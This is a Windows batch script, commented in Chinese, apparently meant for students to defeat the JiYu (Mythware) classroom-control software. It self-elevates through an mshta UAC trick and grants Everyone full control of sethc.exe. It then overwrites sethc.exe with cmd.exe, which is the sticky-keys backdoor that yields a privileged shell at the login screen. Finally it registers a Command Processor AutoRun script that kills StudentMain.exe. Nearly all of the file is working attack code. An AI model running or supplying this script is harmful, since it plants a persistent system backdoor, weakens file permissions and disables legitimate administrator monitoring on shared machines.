@echo off

chcp 65001
color a
cls

%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit

echo 程序包含高风险代码，是否确认执行？如果是误点请立即退出！！！
pause
echo 确定吗！！！
pause
echo 最后一次警告！！！！！
pause
echo 正在强制开启粘滞键...
echo.
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility\StickyKeys" /v Flags /t REG_DWORD /d 511 /f
echo.
echo 成功.
echo.
echo 正在强制设置权限...
echo.
takeown /f "C:\Windows\System32\sethc.exe" /a
icacls "C:\Windows\System32\sethc.exe" /grant Everyone:F
icacls "C:\Windows\System32\sethc.exe" /grant Administrator:F
icacls "C:\Windows\System32\sethc.exe" /grant DefaultAccount:F
icacls "C:\Windows\System32\sethc.exe" /grant Users:F
icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
icacls "C:\Windows\System32\sethc.exe" /grant System:F
takeown /f "C:\Windows\System32\zh-CN\sethc.exe.mui" /a
icacls "C:\Windows\System32\zh-CN\sethc.exe.mui" /grant Everyone:F
icacls "C:\Windows\System32\zh-CN\sethc.exe.mui" /grant Administrator:F
icacls "C:\Windows\System32\zh-CN\sethc.exe.mui" /grant DefaultAccount:F
icacls "C:\Windows\System32\zh-CN\sethc.exe.mui" /grant Users:F
icacls "C:\Windows\System32\zh-CN\sethc.exe.mui" /grant Administrators:F
icacls "C:\Windows\System32\zh-CN\sethc.exe.mui" /grant System:F
echo.
echo 成功.
echo.
echo 正在覆盖系统关键文件...
echo.
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\zh-CN\sethc.exe.mui C:\Windows\System32\zh-CN\sethc.exe.mui.bak
del /f /q /s "C:\Windows\System32\sethc.exe"
del /f /q /s "C:\Windows\System32\zh-CN\sethc.exe.mui"
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\sethc.exe"
copy "C:\Windows\System32\zh-CN\cmd.exe.mui" "C:\Windows\System32\zh-CN\sethc.exe.mui"
echo.
echo 覆盖成功!
echo.
echo 正在注入核心脚本...
echo @echo off>C:\Windows\AutoRun.cmd
echo color a>>C:\Windows\AutoRun.cmd
echo chcp 65001>>C:\Windows\AutoRun.cmd
echo cls>>C:\Windows\AutoRun.cmd
echo echo 正在强制杀死极域控制系统...>>C:\Windows\AutoRun.cmd
echo taskkill /f /im "StudentMain.exe">>C:\Windows\AutoRun.cmd
echo echo 成功! >>C:\Windows\AutoRun.cmd
echo echo 尽情地玩耍吧! >>C:\Windows\AutoRun.cmd
reg add "HKLM\SOFTWARE\Microsoft\Command Processor" /v "AutoRun" /t REG_SZ /d "C:\Windows\AutoRun.cmd" /f
echo.
echo 注入成功!
echo.
pause
